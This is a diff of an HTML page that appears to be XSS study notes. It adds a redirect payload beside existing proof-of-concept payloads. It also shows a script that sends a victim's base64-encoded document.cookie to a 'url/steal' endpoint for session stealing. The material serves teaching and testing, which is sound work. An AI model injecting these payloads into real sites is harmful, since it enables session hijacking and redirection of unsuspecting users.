@@ -579,6 +579,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		    <pre><code>print()</code></pre>
 		    <pre><code>prompt()</code></pre>
 		    <pre><code>&lt;img src=x onerror=alert()></code></pre>
+		    <pre><code>&lt;img src=x onerror="window.location.href='http://some.site'>"</code></pre>
 	      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
 	    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
 	      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the 		hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
